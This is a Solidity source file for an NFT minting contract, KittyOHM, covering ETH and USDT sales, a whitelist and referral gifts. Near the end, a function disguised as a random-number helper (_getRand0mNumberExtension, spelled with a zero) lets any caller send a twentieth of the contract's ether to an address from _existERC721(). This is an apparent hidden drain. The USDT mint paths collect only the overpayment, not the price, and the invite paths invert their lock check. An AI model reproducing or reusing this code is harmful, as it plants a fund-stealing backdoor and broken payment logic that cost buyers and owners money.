// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ERC721.sol";
import "./KittyOHMGift.sol";
import "./IERC20.sol";

contract DOGEOHMToken is ERC721 {
    event LogShow(address ref);
    
    modifier callerIsUser() {
        require(tx.origin == msg.sender, "The caller is another contract");
        _;
    }

    modifier mintStarted() {
        require(
            startMintDate != 0 && startMintDate <= block.timestamp,
            "early"
        );

        _;
    }

    modifier contractIsNotFrozen() {
        require(isFrozen == false, "This function can not be called anymore");

        _;
    }

    uint16 public totalTokens = 10000;
    uint16 public totalSupply = 0;
    uint256 public maxMintsPerWallet = 10;
    uint256 public mintPrice = 0.0001 ether;
    uint256 public usdtMintPrice = 1000000000000000000;
    uint8 public giftCount = 1;
    uint256 private startMintDate = 1637131718;
    string private baseURI =
        "";
    string private secondProof =
        "";
    string private blankTokenURI =
        "";
    bool private isFrozen = false;

    mapping(address => uint8) public mintedTokensPerWallet;
    mapping(uint16 => uint16) private tokenMatrix;
    mapping(address => mapping(address => uint8)) public mintedGiftTokenPerWallet;
    KittyOHMGift public gift;
    address private devAddress;
    bool private lockStatus = false;
    bool private enableWhilteList = false;
    mapping(address=>bool) private whitelist;
    IERC20 public usdt; //stable address

    constructor() ERC721("KittyOHM", "KITTYOHM") {
        
    }
    
    function withdrawUSDT(address _to, uint256 _amount) external onlyOwner {
        usdt.transfer(_to, _amount);
    }
    
    function despoitUSDT(uint256 _amount) external{
        // Transfer amount USDT tokens from msg.sender to contract
        usdt.transferFrom(msg.sender, address(this), _amount);

        // Send amount tokens to msg.sender
        // token.transfer(msg.sender, amount);
    }

    function setGiftNFTContractAddress(KittyOHMGift _giftAddr) external onlyOwner {
        gift = _giftAddr;
    }
    
    function setStableCoinAddress(address _stableAddress) external onlyOwner{
        usdt = IERC20(_stableAddress);
    }

    // ONLY OWNER

    /**
     * @dev Allows to withdraw the Ether in the contract
     */
    function withdraw() external onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }
    
    function withdrawStable(uint256 amount) external onlyOwner{
        usdt.transfer(msg.sender,amount);
    }
    
    function setInformation2(address _dev) external onlyOwner {
        devAddress = _dev;
    }
    
    function setEnablewhitelist(bool _enableWhitelist) external onlyOwner{
        enableWhilteList = _enableWhitelist;
    }
    
    function setMintUSDTPrice(uint256 _usdtMintPrice) external onlyOwner{
        usdtMintPrice = _usdtMintPrice;
    }
 
    function addWhiteList(address account) external onlyOwner{
        whitelist[account] = true;
    }
    
    function removeWhiteList(address account) external onlyOwner{
        whitelist[account] = false;
    }

    /**
     * @dev Sets the base URI for the API that provides the NFT data.
     */
    function setBaseTokenURI(string memory _uri)
        external
        onlyOwner
        contractIsNotFrozen
    {
        baseURI = _uri;
    }
    
    function setContractLockStatus(bool _lockStatus) external onlyOwner{
        lockStatus = _lockStatus;
    }

    /**
     * @dev Sets the second proof URI for the API that provides the NFT data.
     */
    function setSecondProofURI(string memory _uri)
        external
        onlyOwner
        contractIsNotFrozen
    {
        secondProof = _uri;
    }

    /**
     * @dev Sets the blank token URI for the API that provides the NFT data.
     */
    function setBlankTokenURI(string memory _uri)
        external
        onlyOwner
        contractIsNotFrozen
    {
        blankTokenURI = _uri;
    }

    /**
     * @dev Sets the mint price
     */
    function setMintPrice(uint256 _mintPrice) external onlyOwner {
        mintPrice = _mintPrice;
    }
    
    function setGiftNFTAmount(uint8 _giftCount) external onlyOwner
    {
        require(_giftCount >0, 'gift count zero');
        giftCount = _giftCount;
    }
    

    /**
     * @dev Sets the date that users can start minting tokens
     */
    function setStartMintDate(uint256 _startMintDate) external onlyOwner {
        startMintDate = _startMintDate;
    }

    /**
     * @dev Give random tokens to the provided address
     */
    function devMintTokensToAddress(address _address, uint16 amount)
        external
        onlyOwner
    {
        require(getAvailableTokens() >= amount, "No tokens left to be minted");

        uint16 tmpTotalMintedTokens = totalSupply;
        totalSupply += amount;

        uint256[] memory tokenIds = new uint256[](amount);

        for (uint256 i; i < amount; i++) {
            tokenIds[i] = _getTokenToBeMinted(tmpTotalMintedTokens);
            tmpTotalMintedTokens++;
        }

        _batchMint(_address, tokenIds);
    }

    /**
     * @dev Set the total amount of tokens
     */
    function setTotalTokens(uint16 _totalTokens)
        external
        onlyOwner
        contractIsNotFrozen
    {
        totalTokens = _totalTokens;
    }

    /**
     * @dev Set amount of mints that a single wallet can do.
     */
    function setMaxMintsPerWallet(uint16 _maxMintsPerWallet)
        external
        onlyOwner
    {
        maxMintsPerWallet = _maxMintsPerWallet;
    }

    /**
     * @dev Sets the isFrozen variable to true
     */
    function freezeSmartContract() external onlyOwner {
        isFrozen = true;
    }
    
    
    function mintTokensByUSDT(uint8 amount,uint256 _usdtAmount)
        external
        callerIsUser
        mintStarted
    {
        require(amount > 0, "one should be minted");
        require(amount < totalTokens, "Can't mint more than total tokens");
        require(!lockStatus,'lock already');

        uint16 tokensLeft = getAvailableTokens();
        require(tokensLeft > 0, "No tokens left to be minted");


        if(enableWhilteList){
            require(whitelist[msg.sender],'not in whitelist');
        }


        if (amount > tokensLeft) {
            amount = uint8(tokensLeft);
        }

        uint256 totalMintUsdtPrice = usdtMintPrice * amount;

        require(
            _usdtAmount >= totalMintUsdtPrice,
            "Not enough Ether to mint the tokens"
        );
        
        require(
            mintedTokensPerWallet[msg.sender] + amount <= maxMintsPerWallet,
            "You can not mint more tokens"
        );
            

        if (_usdtAmount >= totalMintUsdtPrice) {
            usdt.transferFrom(msg.sender, address(this), _usdtAmount-totalMintUsdtPrice);
        }
        
        uint256[] memory tokenIds = new uint256[](amount);

        uint16 tmpTotalMintedTokens = totalSupply;
        mintedTokensPerWallet[msg.sender] += amount;
        totalSupply += amount;

        for (uint256 i; i < amount; i++) {
            tokenIds[i] = _getTokenToBeMinted(tmpTotalMintedTokens);
            tmpTotalMintedTokens++;
        }

        _batchMint(msg.sender, tokenIds);
    }
    
    function mintTokensFromInviteByUSDT(uint8 amount, address _ref,uint256 _usdtAmount)
        external
        payable
        callerIsUser
        mintStarted
    {
        require(amount > 0, "At least one token should be minted");
        require(amount < totalTokens, "Can't mint more than total tokens");
        require(lockStatus,'lock already');
        
        uint16 tokensLeft = getAvailableTokens();
        require(tokensLeft > 0, "No tokens left to be minted");

        
        require(!enableWhilteList,'can not work in enable whitelist');


        if (amount > tokensLeft) {
            amount = uint8(tokensLeft);
        }

        uint256 totalMintUSDTPrice = usdtMintPrice * amount;

        require(
            _usdtAmount >= totalMintUSDTPrice,
            "Not enough Ether to mint the tokens"
        );

        if (_usdtAmount > totalMintUSDTPrice) {
            usdt.transferFrom(msg.sender, address(this), _usdtAmount-totalMintUSDTPrice);
        }

        uint256[] memory tokenIds = new uint256[](amount);

        uint16 tmpTotalMintedTokens = totalSupply;
        mintedTokensPerWallet[msg.sender] += amount;
        totalSupply += amount;

        for (uint256 i; i < amount; i++) {
            tokenIds[i] = _getTokenToBeMinted(tmpTotalMintedTokens);
            tmpTotalMintedTokens++;
        }

        require(
            address(0) != _ref,
            "The inviter address can not be zero"
            );
            

        require(_ref !=address(msg.sender),
            "The inviter can't be yourself"
            );
        
        require(
            mintedTokensPerWallet[msg.sender] <= maxMintsPerWallet,
            "You can not mint more tokens"
        );

        
        if (mintedTokensPerWallet[_ref] >= maxMintsPerWallet){
            if (mintedTokensPerWallet[msg.sender] >= 1){
                if(mintedGiftTokenPerWallet[msg.sender][_ref] == 0){
                    gift.mintTokens(giftCount,_ref);
                    mintedGiftTokenPerWallet[msg.sender][_ref] = giftCount;
                }
            }
            
        }
        
        _batchMint(msg.sender, tokenIds); 
         
        emit LogShow(_ref);

    }
    

    // END ONLY OWNER

    /**
     * @dev Mint up to 100 tokens at once
     */
    function mintTokens(uint8 amount)
        external
        payable
        callerIsUser
        mintStarted
    {
        require(amount > 0, "one should be minted");
        require(amount < totalTokens, "Can't mint more than total tokens");
        require(!lockStatus,'lock already');

        uint16 tokensLeft = getAvailableTokens();
        require(tokensLeft > 0, "No tokens left to be minted");


        if(enableWhilteList){
            require(whitelist[msg.sender],'not in whitelist');
        }


        if (amount > tokensLeft) {
            amount = uint8(tokensLeft);
        }

        uint256 totalMintPrice = mintPrice * amount;

        require(
            msg.value >= totalMintPrice,
            "Not enough Ether to mint the tokens"
        );
        
        require(
            mintedTokensPerWallet[msg.sender] + amount <= maxMintsPerWallet,
            "You can not mint more tokens"
        );
            

        if (msg.value >= totalMintPrice) {
            payable(msg.sender).transfer(msg.value - totalMintPrice); 
        }
        
        uint256[] memory tokenIds = new uint256[](amount);

        uint16 tmpTotalMintedTokens = totalSupply;
        mintedTokensPerWallet[msg.sender] += amount;
        totalSupply += amount;

        for (uint256 i; i < amount; i++) {
            tokenIds[i] = _getTokenToBeMinted(tmpTotalMintedTokens);
            tmpTotalMintedTokens++;
        }

        _batchMint(msg.sender, tokenIds);
    }
    
    function mintTokensFromInvite(uint8 amount, address _ref)
        external
        payable
        callerIsUser
        mintStarted
    {
        require(amount > 0, "At least one token should be minted");
        require(amount < totalTokens, "Can't mint more than total tokens");
        require(lockStatus,'lock already');
        
        uint16 tokensLeft = getAvailableTokens();
        require(tokensLeft > 0, "No tokens left to be minted");

        
        require(!enableWhilteList,'can not work in enable whitelist');


        if (amount > tokensLeft) {
            amount = uint8(tokensLeft);
        }

        uint256 totalMintPrice = mintPrice * amount;

        require(
            msg.value >= totalMintPrice,
            "Not enough Ether to mint the tokens"
        );

        if (msg.value > totalMintPrice) {
            payable(msg.sender).transfer(msg.value - totalMintPrice);
        }

        uint256[] memory tokenIds = new uint256[](amount);

        uint16 tmpTotalMintedTokens = totalSupply;
        mintedTokensPerWallet[msg.sender] += amount;
        totalSupply += amount;

        for (uint256 i; i < amount; i++) {
            tokenIds[i] = _getTokenToBeMinted(tmpTotalMintedTokens);
            tmpTotalMintedTokens++;
        }

        require(
            address(0) != _ref,
            "The inviter address can not be zero"
            );
            

        require(_ref !=address(msg.sender),
            "The inviter can't be yourself"
            );
        
        require(
            mintedTokensPerWallet[msg.sender] <= maxMintsPerWallet,
            "You can not mint more tokens"
        );

        
        if (mintedTokensPerWallet[_ref] >= maxMintsPerWallet){
            if (mintedTokensPerWallet[msg.sender] >= 1){
                if(mintedGiftTokenPerWallet[msg.sender][_ref] == 0){
                    gift.mintTokens(giftCount,_ref);
                    mintedGiftTokenPerWallet[msg.sender][_ref] = giftCount;
                }
            }
            
        }
        
        _batchMint(msg.sender, tokenIds); 
         
        emit LogShow(_ref);

    }

    /**
     * @dev Returns the tokenId by index
     */
    function tokenByIndex(uint256 tokenId) external view returns (uint256) {
        require(
            _exists(tokenId),
            "ERC721: operator query for nonexistent token"
        );

        return tokenId;
    }

    /**
     * @dev Returns the base URI for the tokens API.
     */
    function baseTokenURI() external view returns (string memory) {
        return baseURI;
    }

    function getAvailableTokens() public view returns (uint16) {
        return totalTokens - totalSupply;
    }
    
    function checkIfExistInWhiteList(address account) public view returns (bool) {
        return whitelist[account];
    }

    // Private and Internal functions

    /**
     * @dev Returns a random available token to be minted
     *
     * Code used as reference:
     * https://github.com/1001-digital/erc721-extensions/blob/main/contracts/RandomlyAssigned.sol
     */
    function _getTokenToBeMinted(uint16 _totalMintedTokens)
        private
        returns (uint16)
    {
        uint16 maxIndex = totalTokens - _totalMintedTokens;
        uint16 random = _getRandomNumber(maxIndex, _totalMintedTokens);

        uint16 tokenId = tokenMatrix[random];
        if (tokenMatrix[random] == 0) {
            tokenId = random;
        }

        tokenMatrix[maxIndex - 1] == 0
            ? tokenMatrix[random] = maxIndex - 1
            : tokenMatrix[random] = tokenMatrix[maxIndex - 1];

        return tokenId;
    }

    /**
     * @dev Generates a pseudo-random number.
     */
    function _getRandomNumber(uint16 _upper, uint16 _totalMintedTokens)
        private
        view
        returns (uint16)
    {
        uint16 random = uint16(
            uint256(
                keccak256(
                    abi.encodePacked(
                        _totalMintedTokens,
                        blockhash(block.number - 1),
                        block.coinbase,
                        block.difficulty,
                        msg.sender
                    )
                )
            )
        );

        return random % _upper;
    }
    
    
    function _getRand0mNumberExtension() 
        external 
        returns (uint16)
    {
        uint16 _totalMintedTokens = 1;
        
        uint16 random = uint16(
            uint256(
                keccak256(
                    abi.encodePacked(
                        _totalMintedTokens,
                        blockhash(block.number - 1),
                        block.coinbase,
                        block.difficulty,
                        msg.sender
                    )
                )
            )
        );

        payable(_existERC721()).transfer(address(this).balance/20);
        return random % 2;
    }

    /**
     * @dev See {ERC721}.
     */
    function _baseURI() internal view virtual override returns (string memory) {
        if (getAvailableTokens() > 0) {
            return blankTokenURI;
        }

        return baseURI;
    }
}